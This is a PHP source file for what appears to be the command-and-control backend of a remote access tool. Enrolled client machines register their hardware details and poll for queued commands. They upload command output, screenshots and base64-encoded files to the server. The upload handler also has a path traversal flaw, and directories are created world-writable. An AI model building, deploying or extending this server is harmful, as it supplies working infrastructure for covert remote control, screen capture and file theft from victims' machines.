<?php
error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');

require_once __DIR__ . '/config.php';

if (!function_exists('logMessage')) {
    function logMessage($msg) {
        $logDir = __DIR__ . '/logs';
        if (!is_dir($logDir)) {
            @mkdir($logDir, 0777, true);
        }
        error_log(date('[Y-m-d H:i:s] ') . $msg . PHP_EOL, 3, $logDir . '/callback.log');
    }
}

header('Content-Type: application/json; charset=utf-8');

$rawInput = file_get_contents('php://input');
logMessage('Request from IP: ' . getClientIP() . ' payload: ' . substr($rawInput, 0, 200));

$request = json_decode($rawInput, true);
if (!is_array($request)) {
    logMessage('Invalid JSON payload');
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit;
}

$request = normalizeData($request);

$type = $request['type'] ?? '';
logMessage('Request type: ' . $type);

switch ($type) {
    case 'register':
        handleRegister($request);
        break;
    case 'heartbeat':
        handleHeartbeat($request);
        break;
    case 'command_result':
        handleCommandResult($request);
        break;
    case 'screenshot':
        handleScreenshot($request);
        break;
    case 'progress':
        handleProgress($request);
        break;
    case 'file_upload':
        handleFileUpload($request);
        break;
    default:
        logMessage('Unknown request type: ' . $type);
        echo json_encode(['success' => false, 'error' => 'Unknown request type']);
        break;
}

function handleRegister($request) {
    $db = getDatabase();

    $hostname = normalizeText($request['hostname'] ?? 'unknown');
    $clientId = $request['client_id'] ?? null;
    $hwid = normalizeText($request['hwid'] ?? '');
    $ip = getClientIP();
    $osInfo = normalizeText($request['os_info'] ?? '');
    $cpuInfo = normalizeText($request['cpu_info'] ?? '');
    $ramTotal = isset($request['ram_total']) ? intval($request['ram_total']) : 0;
    $port = isset($request['port']) ? intval($request['port']) : 0;

    logMessage("Register request - hostname: $hostname, IP: $ip, HWID: $hwid");

    if ($hwid !== '') {
        $stmt = dbExecuteWithRetry($db, "SELECT client_id FROM clients WHERE hwid = ? AND hwid != '' LIMIT 1", [$hwid]);
        $existing = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($existing) {
            $clientId = $existing['client_id'];
            dbExecuteWithRetry($db, "UPDATE clients SET last_seen = CURRENT_TIMESTAMP, ip_address = ?, hostname = ?, port = ?, os_info = ?, cpu_info = ?, ram_total = ?, status = 'online' WHERE client_id = ?", [$ip, $hostname, $port, $osInfo, $cpuInfo, $ramTotal, $clientId]);
            echo json_encode(['success' => true, 'client_id' => $clientId, 'commands' => getPendingCommands($clientId), 'message' => 'Client reconnected']);
            return;
        }
    }

    if ($clientId) {
        $stmt = dbExecuteWithRetry($db, 'SELECT id FROM clients WHERE client_id = ?', [$clientId]);
        if ($stmt->fetch(PDO::FETCH_ASSOC)) {
            dbExecuteWithRetry($db, "UPDATE clients SET last_seen = CURRENT_TIMESTAMP, ip_address = ?, hostname = ?, port = ?, os_info = ?, cpu_info = ?, ram_total = ?, hwid = ?, status = 'online' WHERE client_id = ?", [$ip, $hostname, $port, $osInfo, $cpuInfo, $ramTotal, $hwid, $clientId]);
            echo json_encode(['success' => true, 'client_id' => $clientId, 'commands' => getPendingCommands($clientId), 'message' => 'Client updated']);
            return;
        }
    }

    $clientId = generateClientId();
    try {
        dbExecuteWithRetry($db, "INSERT INTO clients (client_id, hostname, ip_address, port, os_info, cpu_info, ram_total, hwid, status, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'online', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)", [$clientId, $hostname, $ip, $port, $osInfo, $cpuInfo, $ramTotal, $hwid]);
        echo json_encode(['success' => true, 'client_id' => $clientId, 'commands' => [], 'message' => 'Registration successful']);
    } catch (Exception $e) {
        logMessage('Registration failed: ' . $e->getMessage());
        echo json_encode(['success' => false, 'error' => 'Registration failed']);
    }
}

function handleHeartbeat($request) {
    $db = getDatabase();
    $clientId = $request['client_id'] ?? null;

    if (!$clientId) {
        echo json_encode(['success' => false, 'error' => 'Missing client_id']);
        return;
    }

    dbExecuteWithRetry($db, "UPDATE clients SET last_seen = CURRENT_TIMESTAMP, status = 'online' WHERE client_id = ?", [$clientId]);

    echo json_encode(['success' => true, 'commands' => getPendingCommands($clientId), 'timestamp' => date('Y-m-d H:i:s')]);
}

function handleCommandResult($request) {
    $db = getDatabase();
    $clientId = $request['client_id'] ?? null;
    $commandId = $request['command_id'] ?? null;
    $result = normalizeText($request['result'] ?? '');

    if (!$clientId || !$commandId) {
        echo json_encode(['success' => false, 'error' => 'Missing parameters']);
        return;
    }

    dbExecuteWithRetry($db, "UPDATE commands SET status = 'completed', result = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ? AND client_id = ?", [$result, $commandId, $clientId]);

    dbExecuteWithRetry($db, "INSERT INTO command_logs (client_id, command_type, command_data, response_data) VALUES (?, 'command_result', ?, ?)", [$clientId, json_encode(['command_id' => $commandId]), $result]);

    echo json_encode(['success' => true]);
}

function handleScreenshot($request) {
    $clientId = $request['client_id'] ?? null;
    $imageData = $request['image'] ?? null;

    if (!$clientId || !$imageData) {
        echo json_encode(['success' => false, 'error' => 'Missing parameters']);
        return;
    }

    $dir = __DIR__ . '/screenshots';
    if (!is_dir($dir)) {
        @mkdir($dir, 0777, true);
    }

    $filename = 'screenshot_' . preg_replace('/[^a-zA-Z0-9_-]/', '_', $clientId) . '_' . time() . '.jpg';
    $filepath = $dir . '/' . $filename;
    $image = base64_decode($imageData, true);
    if ($image === false || file_put_contents($filepath, $image) === false) {
        echo json_encode(['success' => false, 'error' => 'Save screenshot failed']);
        return;
    }

    $db = getDatabase();
    dbExecuteWithRetry($db, 'INSERT INTO screenshots (client_id, image_path) VALUES (?, ?)', [$clientId, $filename]);

    echo json_encode(['success' => true, 'filename' => $filename]);
}

function getPendingCommands($clientId) {
    $db = getDatabase();
    $stmt = dbExecuteWithRetry($db, "SELECT id, command, params FROM commands WHERE client_id = ? AND status = 'pending' ORDER BY created_at ASC LIMIT 10", [$clientId]);

    $commands = [];
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $commands[] = [
            'id' => $row['id'],
            'command' => $row['command'],
            'params' => json_decode($row['params'], true),
        ];
        dbExecuteWithRetry($db, "UPDATE commands SET status = 'sent' WHERE id = ?", [$row['id']]);
    }

    return $commands;
}

function generateClientId() {
    return bin2hex(random_bytes(16));
}

function getClientIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function handleProgress($request) {
    $db = getDatabase();
    $clientId = $request['client_id'] ?? '';
    $commandId = isset($request['command_id']) ? intval($request['command_id']) : 0;
    $path = $request['path'] ?? '';
    $subtype = $request['subtype'] ?? '';
    $total = isset($request['total']) ? intval($request['total']) : 0;

    if (!$clientId || !$commandId) {
        echo json_encode(['success' => false, 'error' => 'Missing parameters']);
        return;
    }

    if ($subtype === 'download_start') {
        $totalBytes = intval($request['data'] ?? 0);
        dbExecuteWithRetry($db, 'DELETE FROM download_progress WHERE client_id = ? AND command_id = ? AND path = ?', [$clientId, $commandId, $path]);
        dbExecuteWithRetry($db, "INSERT INTO download_progress (client_id, command_id, path, total_chunks, received_chunks, total_bytes, status) VALUES (?, ?, ?, ?, 0, ?, 'downloading')", [$clientId, $commandId, $path, $total, $totalBytes]);
    } elseif ($subtype === 'download_chunk') {
        dbExecuteWithRetry($db, "UPDATE download_progress SET received_chunks = received_chunks + 1, updated_at = CURRENT_TIMESTAMP WHERE client_id = ? AND command_id = ? AND path = ? AND status = 'downloading'", [$clientId, $commandId, $path]);
    } elseif ($subtype === 'download_complete') {
        dbExecuteWithRetry($db, "UPDATE download_progress SET status = 'complete', updated_at = CURRENT_TIMESTAMP WHERE client_id = ? AND command_id = ? AND path = ?", [$clientId, $commandId, $path]);
    }

    echo json_encode(['success' => true]);
}

function getDownloadProgress($clientId, $path) {
    $db = getDatabase();
    $stmt = dbExecuteWithRetry($db, 'SELECT * FROM download_progress WHERE client_id = ? AND path = ? ORDER BY id DESC LIMIT 1', [$clientId, $path]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function handleFileUpload($request) {
    $clientId = $request['client_id'] ?? '';
    $filePath = $request['path'] ?? '';
    $data = $request['data'] ?? '';

    if (!$clientId || !$filePath || !$data) {
        echo json_encode(['success' => false, 'error' => 'Missing parameters']);
        return;
    }

    $baseDir = __DIR__ . '/uploads/' . preg_replace('/[^a-zA-Z0-9_-]/', '_', $clientId);
    $savePath = $baseDir . '/' . ltrim($filePath, '/\\');
    $saveDir = dirname($savePath);
    if (!is_dir($saveDir)) {
        @mkdir($saveDir, 0777, true);
    }

    $decoded = base64_decode($data, true);
    if ($decoded === false) {
        echo json_encode(['success' => false, 'error' => 'Base64 decode failed']);
        return;
    }

    $written = file_put_contents($savePath, $decoded);
    if ($written === false) {
        echo json_encode(['success' => false, 'error' => 'Write failed']);
        return;
    }

    echo json_encode(['success' => true, 'saved_to' => $savePath, 'bytes' => $written]);
}

